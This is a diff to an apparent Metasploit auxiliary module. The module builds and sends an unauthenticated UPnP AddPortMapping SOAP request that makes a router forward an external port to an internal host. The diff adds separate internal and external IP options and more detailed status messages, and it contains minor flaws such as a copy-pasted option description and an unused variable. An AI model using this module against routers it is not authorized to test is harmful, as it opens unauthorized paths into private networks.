@@ -19,7 +19,8 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         OptString.new('TARGETURI', [true, 'UPnP control URL', '/' ]),
-        OptString.new('INTERNAL_CLIENT', [true, 'New Internal Client']),
+        OptString.new('INTERNAL_IP', [false, 'New Internal Client']),
+        OptString.new('EXTERNAL_IP', [false, 'New Internal Client']),
         OptEnum.new('PROTOCOL', [true, 'Transport level protocol to map', 'TCP', %w(TCP UDP)]),
         OptInt.new('INTERNAL_PORT', [true, 'New Internal Port']),
         OptInt.new('EXTERNAL_PORT', [true, 'New External Port']),
@@ -29,7 +30,28 @@ class Metasploit3 < Msf::Auxiliary
     )
   end
 
-  def setup
+  def internal_port
+    @internal_port ||= datastore['INTERNAL_PORT']
+  end
+
+  def internal_ip
+    @internal_ip ||= datastore['INTERNAL_IP']
+  end
+
+  def external_port
+    @external_port ||= datastore['EXTERNAL_PORT']
+  end
+
+  def external_ip
+    @external_ip ||= datastore['EXTERNAL_IP']
+  end
+
+  def lease_duration
+    @lease_duration ||= datastore['LEASE_DURATION']
+  end
+
+  def protocol
+    @protocol ||= datastore['PROTOCOL']
   end
 
   def run
@@ -38,13 +60,13 @@ class Metasploit3 < Msf::Auxiliary
     content << "<SOAP-ENV:Body>"
     content << "<m:AddPortMapping xmlns:m=\"urn:schemas-upnp-org:service:WANIPConnection:1\">"
     content << "<NewPortMappingDescription>#{Rex::Text.rand_text_alpha(8)}</NewPortMappingDescription>"
-    content << "<NewLeaseDuration>#{datastore['LEASE_DURATION']}</NewLeaseDuration>"
-    content << "<NewInternalClient>#{datastore['INTERNAL_CLIENT']}</NewInternalClient>"
+    content << "<NewLeaseDuration>#{lease_duration}</NewLeaseDuration>"
+    content << "<NewInternalClient>#{internal_ip}</NewInternalClient>"
     content << "<NewEnabled>1</NewEnabled>"
-    content << "<NewExternalPort>#{datastore['EXTERNAL_PORT']}</NewExternalPort>"
-    content << "<NewRemoteHost></NewRemoteHost>"
-    content << "<NewProtocol>#{datastore['PROTOCOL']}</NewProtocol>"
-    content << "<NewInternalPort>#{datastore['INTERNAL_PORT']}</NewInternalPort>"
+    content << "<NewExternalPort>#{external_port}</NewExternalPort>"
+    content << "<NewRemoteHost>#{external_ip}</NewRemoteHost>"
+    content << "<NewProtocol>#{protocol}</NewProtocol>"
+    content << "<NewInternalPort>#{internal_port}</NewInternalPort>"
     content << "</m:AddPortMapping>"
     content << "</SOAP-ENV:Body>"
     content << "</SOAP-ENV:Envelope>"
@@ -59,13 +81,15 @@ class Metasploit3 < Msf::Auxiliary
     )
 
     if res
+      map_target = Rex::Socket.source_address(rhost)
+      map = "#{rhost}:#{external_port}/#{protocol} -> #{internal_ip}:#{internal_port}/#{protocol}"
       if res.code == 200
-        print_good("#{peer} successfully mapped")
+        print_good("#{peer} successfully mapped #{map}")
       else
-        print_error("#{peer} failed to map #{res}")
+        print_error("#{peer} failed to map #{map}: #{res}")
       end
     else
-      print_error("#{peer} no response")
+      print_error("#{peer} no response for mapping #{map}")
     end
   end
 end
